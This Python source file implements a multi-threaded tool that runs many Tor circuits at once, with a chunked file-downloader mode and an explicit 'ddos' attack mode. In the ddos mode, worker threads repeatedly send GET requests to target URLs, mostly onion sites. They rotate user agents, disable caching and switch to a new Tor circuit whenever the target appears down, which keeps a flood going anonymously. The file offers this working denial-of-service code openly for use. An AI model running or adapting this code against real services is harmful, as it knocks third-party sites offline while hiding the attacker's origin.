#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import argparse
import subprocess
import threading
import signal
import queue
import time
import socket
import requests
import shutil
import psutil
import random
import copy
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()

KILL_RECEIVED = False

MODE = None
N_CIRCUITS = None
DEBUG_OUTPUT = None
TMP_DIR = None
CHANGE_CIRCUITS = None
PORT_START = None
TOR_BINARY = None
CHUNK_SIZE = None
OUTPUT_DIR = None
MAX_ATTEMPTS = None

TARGET_LIST = None

WORKER_STRUCT_SKEL = {
    "thread": None, # worker Thread (threading.Thread)
    "index": None,  # Local thread index
    "state": None,  # Worker state
    "done": None,   # Must end
    "control_port": None,   # Tor Control port
    "socks_port": None,     # Tor Socks port
    "tor_process": None,    # Tor Process (subprocess.Popen)
    "exit_ip": None,        # Last Tor network exit IP
    "stats": {
        "timestamp_req": None,
        "acum_req": 0,
    }
}
WORKER_STRUCTS_ARR = []

TASK_QUEUE = None
TARGET_CHUNK_LIST = {}

# Output

class Style():

    # Mode

    END      = '\33[0m'
    BOLD     = '\33[1m'
    ITALIC   = '\33[3m'
    URL      = '\33[4m'
    BLINK    = '\33[5m'
    BLINK2   = '\33[6m'
    SELECTED = '\33[7m'

    # Font color

    BLACK  = '\33[30m'
    RED    = '\33[31m'
    GREEN  = '\33[32m'
    YELLOW = '\33[33m'
    BLUE   = '\33[34m'
    VIOLET = '\33[35m'
    BEIGE  = '\33[36m'
    WHITE  = '\33[37m'

    GREY    = '\33[90m'
    RED2    = '\33[91m'
    GREEN2  = '\33[92m'
    YELLOW2 = '\33[93m'
    BLUE2   = '\33[94m'
    VIOLET2 = '\33[95m'
    BEIGE2  = '\33[96m'
    WHITE2  = '\33[97m'

    # Background color

    BLACKBG  = '\33[40m'
    REDBG    = '\33[41m'
    GREENBG  = '\33[42m'
    YELLOWBG = '\33[43m'
    BLUEBG   = '\33[44m'
    VIOLETBG = '\33[45m'
    BEIGEBG  = '\33[46m'
    WHITEBG  = '\33[47m'

    GREYBG    = '\33[100m'
    REDBG2    = '\33[101m'
    GREENBG2  = '\33[102m'
    YELLOWBG2 = '\33[103m'
    BLUEBG2   = '\33[104m'
    VOLETBG2 = '\33[105m'
    BEIGEBG2  = '\33[106m'
    WHITEBG2  = '\33[107m'

threading.current_thread().name = "Adam"
THREAD_NAMES = ["Isaac", "Jacob", "Jeremiah", "Abraham", "Abel", "Cain", "Seth", "David", "Eve", "Samson", "Miriam", "Rachel", "Rebecca", "Sarah"]

def roman_numeral(n):
    res = ""
    table = [(1000, "M"), (900, "CM"), (500, "D"), (400, "CD"), (100, "C"), (90, "XC"), (50, "L"), (40, "XL"), (10, "X"), (9, "IX"), (5, "V"), (4, "IV"), (1, "I")]
    for cap, roman in table:
        d, m = divmod(n, cap)
        res += roman * int(d)
        n = m
    return res

import builtins as __builtin__
def print(*args, **kwargs):
    if DEBUG_OUTPUT:
        return __builtin__.print(
            Style.BLUE2 + "[" \
            + Style.GREEN2 + str(threading.current_thread().name) \
            + Style.BLUE2 + ":" \
            + Style.ITALIC + Style.VIOLET + sys._getframe(1).f_code.co_name + "()" \
            + Style.END + Style.BLUE2 + "]" \
            + Style.END,
            *args,
            **kwargs
        )

# Worker download Mode

def get_size(worker_struct, file_url):
    try:
        response = requests.head(
            file_url,
            proxies = {
                'http': 'socks5h://localhost:'+str(worker_struct["socks_port"]),
                'https': 'socks5h://localhost:'+str(worker_struct["socks_port"])
            },
            timeout=30,
            allow_redirects=True,
            )
    except (requests.exceptions.ConnectionError,
        requests.exceptions.ConnectTimeout,
        urllib3.connectionpool.TimeoutError,
        urllib3.connectionpool.MaxRetryError,
        ) as e:
        return None
    if response.status_code != 200:
        return None
    size = int(response.headers['Content-Length'])
    return size

def download_chunk(worker_struct, task):
    worker_struct["state"] = "downloading"
    task["status"] = "downloading"

    # Get task info
    url = task["url"]
    start = task["init_byte"]
    end = task["end_byte"]
    output = task["save_as"]
    
    print("Downloading chunk", output)
    try:
        response = requests.get(
            url,
            proxies = {
                'http': 'socks5h://localhost:'+str(worker_struct["socks_port"]),
                'https': 'socks5h://localhost:'+str(worker_struct["socks_port"])
            },
            headers = {'Range': f'bytes={start}-{end}'},
        )
    except (requests.exceptions.ConnectionError,
        requests.exceptions.ConnectTimeout,
        urllib3.connectionpool.TimeoutError,
        urllib3.connectionpool.MaxRetryError,
        ) as e:
        task["attempts"] += 1
        if task["attempts"] >= MAX_ATTEMPTS:
            print(Style.RED + "Max Attempts reached:" + Style.END, "Could not download file chunk from", task["url"])
        else:
            print(Style.YELLOW + "Failed attempt " + str(task["attempts"]) + ":" + + Style.END + " Could not download file chunk from", task["url"])
            # Add task to the queue again
            add_task_queue(task)
            # Delay to avoid picking it again if happens to be the last task
            time.sleep(5) # Same delay as wait when found queue empty
        return
    if response.status_code == 200 or response.status_code == 206: # OK or Partial Content
        task["status"] = "downloaded"
        print("Chunk downloaded successfully")
        # Save chunk
        f = open(output, 'wb')
        for part in response.iter_content(1024):
            f.write(part)
        f.close()
    else:
        task["status"] = str(response.status_code)[:1]
        task["status"] = "error"

def download_worker(worker_struct):
    while True:
        if worker_struct["done"]:
            return
        # Check if any tasks
        if TASK_QUEUE.empty():
            print("Queue is empty! Waiting 5 seconds...")
            worker_struct["state"] = "queue_empty"
            time.sleep(5)
            continue
        # Get task from queue
        worker_struct["state"] = "download_setup"
        try:
            task = TASK_QUEUE.get()
        except queue.Empty:
            continue
        if not task:
            continue
        if task["type"] == "chunk":
            # Download chunk
            download_chunk(worker_struct, task)
        elif task["type"] == "file":
            # Calculate chunks and add to queue
            print("Got unchunked target:", task["url"])
            worker_struct["state"] = "chunking"
            # Output file
            parsed = urlparse(task["url"])
            output_file = OUTPUT_DIR + parsed.path
            os.makedirs(os.path.dirname(output_file), exist_ok=True)
            # Chunk
            file_size = get_size(worker_struct, task["url"])
            if file_size is None: # Could not get file size (timeout, connection error...)
                task["attempts"] += 1
                if task["attempts"] >= MAX_ATTEMPTS:
                    print(Style.RED + "Max Attempts reached:" + Style.END, "Could not get file size of", task["url"])
                else:
                    print(Style.YELLOW + "Failed attempt " + str(task["attempts"]) + ":" + Style.END + " Could not get file size of", task["url"])
                    # Add task to the queue again
                    add_task_queue(task)
                    # Change circuit
                    change_circuit(worker_struct)
                    
                    # TODO : Delay to avoid picking it again if happens to be the last task
                    # time.sleep(5) # Same delay as wait when found queue empty

                continue
            chunks = range(0, file_size, CHUNK_SIZE)
            for i, start in enumerate(chunks):
                chunk_file = output_file + ".chunk" + str(i) + "_" + str(CHUNK_SIZE) + ".storm"
                chunk_task = {
                        "type": "chunk",
                        "url": task["url"],
                        "init_byte": start,
                        "end_byte": min(start + CHUNK_SIZE - 1, file_size),
                        "save_as": chunk_file,
                        "file_size": file_size,
                        "attempts": 0,
                        "status": "queued",
                    }
                # Check if it already exists
                if os.path.exists(chunk_file) and os.path.isfile(chunk_file):
                    print("Chunk already downloaded:", chunk_file)
                    chunk_task["status"] = "downloaded"
                else:
                    add_task_queue(chunk_task)
                
                if parsed.path not in TARGET_CHUNK_LIST:
                    TARGET_CHUNK_LIST[parsed.path] = []
                TARGET_CHUNK_LIST[parsed.path].append(chunk_task)

# Worker DDoS mode

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def request_response_hook(r, *args, **kwargs):
    print("HTTP", r.status_code, "--", r.url)

def ddos_worker(worker_struct):
    worker_struct["state"] = "ddos"
    # get target
    url = TARGET_LIST[worker_struct["index"] % len(TARGET_LIST)]
    print("Start DDoS attack at", url)
    count = 0
    while True:
        if worker_struct["done"]:
            return
        try:
            # TODO : Make it Async
            response = requests.get(
                url,
                proxies = {
                    'http': 'socks5h://localhost:'+str(worker_struct["socks_port"]), # '5' -> DNS res. on client. '5h' -> DNS res. on proxy.
                    'https': 'socks5h://localhost:'+str(worker_struct["socks_port"])
                },
                headers = {
                    "User-Agent": user_agents[count % len(user_agents)],
                    "Accept-Language": "en-us,en;q=0.5",
                    "Cache-Control": "no-store, no-cache",
                },
                hooks={"response": request_response_hook},
                timeout=90)
            count += 1
            print(Style.YELLOWBG + "[UP]" + Style.END + f" Hit! HTTP {response.status_code}")
        except (requests.exceptions.ConnectionError,
                requests.exceptions.ConnectTimeout,
                urllib3.connectionpool.TimeoutError,
                urllib3.connectionpool.MaxRetryError,
                ) as e:
            if worker_struct["done"]:
                return
            worker_struct["state"] = "ddos (Down)"
            print(Style.REDBG + "[DOWN]" + Style.END + f" Site seems down! (Or unreachable) Changing circuit...")
            change_circuit(worker_struct)
            print("Waiting 10 seconds to proceed...")
            time.sleep(10) # retry every 10 seconds.
            continue
        except Exception as e:
            if worker_struct["done"]:
                return
            raise e
        if response.status_code == 200:
            worker_struct["state"] = "ddos (Up)"
        else:
            raise Exception("Request did not result in HTTP 200 OK.")

# Worker Tor management

def killall_tor():
    print("Killing all Tor processes...")
    os.system('killall tor 1>/dev/null 2>&1')

def worker_kill_tor(worker_struct):
    print("Killing Tor process...")
    try:
        worker_struct["tor_process"].kill()
        worker_struct["tor_process"].wait() # avoid defunct
    except Exception as e:
        print("Error killing Tor process:", e)
    # Second try to kill the process (should not be needed)
    try:
        process = psutil.Process(worker_struct["tor_process"].pid)
        process.kill()
        process.wait()
    except psutil.NoSuchProcess:
        return

def start_tor(worker_struct):
    # start a Tor process with a SOCKS listener on the specified port
    while True:
        print("Starting Tor process...")
        tmp_dir_name = str(worker_struct["index"])+"_"+str(int(random.random()*314159))
        tmp_data_directory = os.path.join(TMP_DIR, tmp_dir_name)
        tor_process = subprocess.Popen([
            TOR_BINARY,
            '--SocksPort', str(worker_struct["socks_port"]),
            '--ControlPort', str(worker_struct["control_port"]),
            '--DataDirectory', str(tmp_data_directory)
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Waiting Tor bootstrap...")
        warnings = "Last warnings:\n"
        for line in iter(tor_process.stdout.readline, b""):
            if worker_struct["done"]:
                return tor_process # So that it can be killed
            line = line.decode('utf-8').strip()
            if "[notice]" in line and "Bootstrapped" in line:
                aux = line.split("% ")[1].split("): ")
                short = aux[0][1:]
                descr = aux[1]
                worker_struct["state"] = short
                print (descr)
                if "Bootstrapped 100%" in line:
                    return tor_process
            elif "[warn]" in line:
                if "no authentication method" not in line:
                    warnings += Style.YELLOW + "Warning: " + Style.END + line.split("[warn] ")[1] + "\n"
            elif "[err]" in line:
                print (warnings, end='')
                print (Style.RED + "Error occurred: " + Style.END + line.split("[err] ")[1])
            else:
                pass
        # Wait retry
        print("Retry starting Tor process in 1 second...")
        time.sleep(1)

def test_connection(worker_struct):
    worker_struct["state"] = "testing_connection"
    socks_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socks_socket.settimeout(30)
    socks_socket.connect(('127.0.0.1', worker_struct["control_port"]))
    
    # Check Authentication
    socks_socket.send(b'AUTHENTICATE\n')
    response = socks_socket.recv(1024).decode().replace("\n", "").replace("\r", "")
    print("AUTHENTICATE:", response)
    if '250 OK' not in response:
        raise Exception('Tor authentication failed')
    
    # Check circuits
    socks_socket.send(b'GETINFO circuit-status\n')
    response = socks_socket.recv(4096).decode()
    print("GETINFO circuit-status:", response.count(" BUILT $"), "circuit(s) found.")
    if '250+circuit-status=' not in response or '+BUILD_FLAGS=NEED_CAPACITY' in response:
        raise Exception("Tor circuit not established yet")
    
    # Check circuit established
    socks_socket.send(b'GETINFO status/circuit-established\r\nQUIT\r\n')
    response = socks_socket.recv(1024).decode().replace("\n", "").replace("\r", "")
    if 'circuit-established=1' not in response:
       print ("Circuit is not established.")
       raise Exception("Circuit is not established.")
    else:
       print ("Circuit is established.")
    
    # Update state exit IP
    get_exit_ip(worker_struct)

    socks_socket.close()

def get_exit_ip(worker_struct):
    print("Updating exit IP...")
    url = "http://httpbin.org/ip"
    response = requests.get(
        url,
        proxies = {
            'http': 'socks5://localhost:'+str(worker_struct["socks_port"]), # if url is onion, change to socks5h://localhost
            'https': 'socks5://localhost:'+str(worker_struct["socks_port"])
        })
    if response.status_code == 200:
        ip = response.json()['origin']
        worker_struct["exit_ip"] = ip
        return ip
    else:
        return None

def change_circuit(worker_struct):
    worker_struct["state"] = "changing_circuit"
    socks_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socks_socket.settimeout(30)
    socks_socket.connect(('127.0.0.1', worker_struct["control_port"]))

    # Check Initial Exit IP
    current_ip = get_exit_ip(worker_struct)
    print("Current IP:", current_ip)

    # Authentication
    socks_socket.send(b'AUTHENTICATE\n')
    response = socks_socket.recv(1024).decode().replace("\n", "").replace("\r", "")
    print("AUTHENTICATE:", response)
    if '250 OK' not in response:
        raise Exception('Tor authentication failed')

    # Request a new circuit
    socks_socket.send(b'SIGNAL NEWNYM\n')
    response = socks_socket.recv(1024).decode().replace("\n", "").replace("\r", "")
    print("SIGNAL NEWNYM:", response)
    if '250 OK' not in response:
        raise Exception('Tor circuit creation failed')

    # Check Initial Exit IP
    max_retries = 4
    retries = 0
    while current_ip == get_exit_ip(worker_struct):
        retries += 1
        if retries > max_retries:
            print("It's taking too long. Skip waiting.")
            break
        print("Waiting...")
        time.sleep(1)
    if retries <= max_retries:
        print("New IP:", get_exit_ip(worker_struct))
    
    # Check circuit established
    socks_socket.send(b'GETINFO status/circuit-established\r\nQUIT\r\n')
    response = socks_socket.recv(1024).decode().replace("\n", "").replace("\r", "")
    if 'circuit-established=1' not in response:
       print ("Circuit is not established.")
       raise Exception("Circuit is not established.")
    else:
       print ("Circuit is established.")
    
    socks_socket.close()

# Worker generic functions

def worker_die(worker_struct):
    # kill Tor process
    worker_kill_tor(worker_struct)
    # die
    print("Die.")
    exit(0)

def worker(worker_struct):
    # Rename thread
    threading.current_thread().name = THREAD_NAMES[worker_struct["index"] % len(THREAD_NAMES)] + "-" + roman_numeral(1 + worker_struct["index"] / len(THREAD_NAMES))
    print("Setting up...")
    while not worker_struct["done"]:
        try:
            # Create Tor process
            print("Spawning Tor process...")
            worker_struct["tor_process"] = start_tor(worker_struct)
            # Test connection: circuit established
            if worker_struct["done"]:
                break
            print("Testing connection...")
            test_connection(worker_struct)
            # Worker job
            print("Running Job...")
            if MODE == "ddos":
                ddos_worker(worker_struct)
            elif MODE == "down":
                download_worker(worker_struct)
        except Exception as e:
            if worker_struct["done"]:
                break
            else:
                print(Style.RED + "Error on job:" + Style.END, e)
                worker_kill_tor(worker_struct)
            # Start over
            print ("Wait one second before retrying...")
            time.sleep(1)
            continue
    if worker_struct["done"]:
        print(Style.VOLETBG2 + Style.BOLD + Style.WHITE + " The End is Nigh " + Style.END)
    # stop the Tor process
    worker_die(worker_struct)

# Main download mode

def join_chunks():
    for t in TARGET_CHUNK_LIST.keys():
        completed = True
        for ch in TARGET_CHUNK_LIST[t]:
            if ch["status"] != "downloaded":
                completed = False
        if completed:
            print ("All chunks completed for", t)
            parts = [ch["save_as"] for ch in TARGET_CHUNK_LIST[t]]
            with open(OUTPUT_DIR + t, 'wb') as outfile:
                for part in parts:
                    with open(part, 'rb') as infile:
                        outfile.write(infile.read())
            if os.path.exists(OUTPUT_DIR + t):
                print ("Successfully joined", t)
                for part in parts:
                    os.remove(part)

# Main functions

def header():
    __builtin__.print(Style.BOLD + Style.VIOLET + '''
   ██████ ▄███████▓ ▒█████  ░██▀██▄  ░███▄ ▄███▒
 ▒██    ▒ ▓  ██▒ ▓░▒██▒  ██░▓██ ▒ ██░▒██▒▀█▀ ██▒
 ░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ░▓██  ░ ▓██░
   ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ▒██    ▒██
 ▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒▒██▒   ░██▒
 ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ░ ▒░
 ░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░▒ ░ ▒░░  ░     ░
 ░  ░  ░    ░      ░ ░ ░ ▒    ░░   ░ ░      ░
       ░               ░ ░     ░
''' + Style.END)

def kill_handler(signal_number, stack_frame):
    signal_name = signal.Signals(signal_number).name
    __builtin__.print(f"\nReceived {signal_name}. Exiting...")
    # kill workers
    print("Ordering workers to die...")
    for w_s in WORKER_STRUCTS_ARR:
        w_s["done"] = True
    global KILL_RECEIVED
    KILL_RECEIVED = True

def stats():
    __builtin__.print("Worker Stats")
    for w_s in WORKER_STRUCTS_ARR:
        __builtin__.print(" * Thread", w_s["index"], ("(" + w_s["exit_ip"] + ")" if w_s["exit_ip"] else ""), ":", w_s["state"])

    if MODE == "down":
        __builtin__.print("\nFile Status")
        for file in sorted(TARGET_CHUNK_LIST.keys()):
            chunk_status = [x["status"] for x in TARGET_CHUNK_LIST[file]]
            __builtin__.print(" * [", end='')
            for ch in chunk_status:
                if ch == "queued":
                    __builtin__.print(".", end='')
                elif ch == "downloaded":
                    __builtin__.print("#", end='')
                elif ch == "downloading":
                    __builtin__.print("@", end='')
                elif ch == "error":
                    __builtin__.print("X", end='')
                else:
                    __builtin__.print(ch, end='')
            __builtin__.print("]", file)

def add_task_queue(task):
    TASK_QUEUE.put(
        task,
        block=True,
        timeout=None
    )

def setup_tasks_queue():
    print("Adding tasks to the thread-safe queue...")
    global TASK_QUEUE
    TASK_QUEUE = queue.Queue() # A thread-safe queue
    # Fill queue with tasks
    for t in TARGET_LIST:
        add_task_queue({
            "type": "file",
            "url": t,
            "file_size": None,
            "attempts": 0,
            "status": "queued",
        })
    
def main():
    # signals
    signal.signal(signal.SIGINT, kill_handler)
    signal.signal(signal.SIGTERM, kill_handler)

    # header
    header()
    if MODE == "ddos":
        print("Mode: DDoS")
    elif MODE == "down":
        print("Mode: Downloader")

    # check, create, clean directories
    if os.path.exists(TMP_DIR) and len(os.listdir(TMP_DIR)) > 0:
        print("Remove contents from", TMP_DIR)
        shutil.rmtree(TMP_DIR, ignore_errors=True)
    if not os.path.exists(TMP_DIR):
        print("Create", TMP_DIR)
        os.makedirs(TMP_DIR)
    if OUTPUT_DIR and not os.path.exists(OUTPUT_DIR):
        print("Create", OUTPUT_DIR)
        os.makedirs(OUTPUT_DIR)

    # kill tor processes
    killall_tor()

    # fill task queue if download mode
    if MODE == "down":
        setup_tasks_queue()

    # create N threads, each running the worker function
    threads = []
    for i in range(N_CIRCUITS):
        w = copy.copy(WORKER_STRUCT_SKEL)
        t = threading.Thread(target=worker, args=(w,))
        threads.append(t)
        # Worker struct
        w["thread"] = t
        w["index"] = i
        w["state"] = "spawned"
        w["socks_port"] = PORT_START + i * 2
        w["control_port"] = w["socks_port"] + 1
        WORKER_STRUCTS_ARR.append(w)
        t.start()

    # Main loop
    end_main_loop = False
    while not KILL_RECEIVED and not end_main_loop:
        
        if MODE == "down":
            # Validate downloaded files and assemble download file parts
            join_chunks()
        
        if MODE == "down":
            # Break condition
            if TASK_QUEUE.empty(): # Queue is empty
                end = True
                for w in WORKER_STRUCTS_ARR: # all processes are in state waiting queue
                    if w["state"] != "queue_empty":
                        end = False
                        break
                if end:
                    print("Queue is empty and all workers are idle.")
                    print("Ordering workers to die...")
                    for w_s in WORKER_STRUCTS_ARR:
                        w_s["done"] = True
                    # Break main loop
                    end_main_loop = True # Not break here so that the last Worker Stats are printed
        
        if not DEBUG_OUTPUT:
            # Worker Stats
            os.system('clear')
            header()
            stats()
        
        time.sleep(0.3)

    print("Waiting workers to die...")
    for t in threads:
        t.join()
    
    # kill remaining tor processes (if any)
    killall_tor()

    # Empty tmp dir
    if os.path.exists(TMP_DIR) and len(os.listdir(TMP_DIR)) > 0:
        print("Clear", TMP_DIR)
        shutil.rmtree(TMP_DIR, ignore_errors=True)

    print("Bye!")
    exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A multi-purpose tool using concurrent Tor circuits.')

    # common arguments
    parser.add_argument('-c', '--circuits',     type=int,   help='Number of concurrent circuits to establish', default=1)
    parser.add_argument('-t', '--tmp-dir',      type=str,   help='Dedicated temporal data directory', default=os.path.join(os.getcwd(), "tmp"))
    parser.add_argument('-C', '--change-circuits',          help='Try using a new circuit (different IP) for each request.', action='store_true')
    parser.add_argument('-p', '--port-start',   type=int,   help='Number of concurrent circuits to establish', default=9050)
    parser.add_argument('-T', '--tor-bin',      type=str,   help='Tor binary path', default='/usr/bin/tor')
    parser.add_argument('-D', '--debug',                    help='Print debugger messages', action='store_true')
    
    subparsers = parser.add_subparsers(title='mode', dest='mode', help='mode', required=True)

    # ddos mode arguments
    ddos_parser = subparsers.add_parser('ddos', help='DDOS attack mode')
    ddos_parser.add_argument('-u', '--target-url',      type=str, help='Onion URL to hit')
    ddos_parser.add_argument('-l', '--targets-list',    type=str, help='Comma separated list of URLs to hit')
    ddos_parser.add_argument('-f', '--targets-file',    type=str, help='File containing a list of file URLs to hit')

    # download mode arguments
    downloader_parser = subparsers.add_parser('down', help='File downloader mode')
    downloader_parser.add_argument('-u', '--target-url',    type=str, help='Onion URL to download')
    downloader_parser.add_argument('-l', '--targets-list',  type=str, help='Comma separated list of URLs to download')
    downloader_parser.add_argument('-f', '--targets-file',  type=str, help='File containing a list of file URLs to download')
    downloader_parser.add_argument('-o', '--output-dir',    type=str, help='Where the downloaded files are saved', default=os.path.join(os.getcwd(), "data"))
    downloader_parser.add_argument('-s', '--chunk-size',    type=int, help='Size (in bytes) of the download chunks', default=1024*1024)
    downloader_parser.add_argument('-m', '--max-attempts',  type=int, help='Max number of attempts to download a file', default=5)

    # index discover mode arguments
    # discover_parser = subparsers.add_parser('disc', help='File discover mode')

    # parse args
    args = parser.parse_args()

    # common
    MODE = args.mode
    N_CIRCUITS = args.circuits
    DEBUG_OUTPUT = args.debug
    TMP_DIR = args.tmp_dir
    CHANGE_CIRCUITS = args.change_circuits
    PORT_START = args.port_start
    TOR_BINARY = args.tor_bin

    # download
    if MODE == "down":
        CHUNK_SIZE = args.chunk_size
        OUTPUT_DIR = args.output_dir
        MAX_ATTEMPTS = args.max_attempts

    # ddos / download
    if MODE == "ddos" or MODE == "down":
        if args.target_url:
            TARGET_LIST = [args.target_url]
        elif args.targets_list:
            TARGET_LIST = args.targets_list.split(',')
        elif args.targets_file:
            TARGET_LIST = [l for l in open(args.targets_file, 'r').readlines() if l.strip()]
        else:
            __builtin__.print("Error: no target specified.")
            parser.print_usage()
            exit(1)

    main()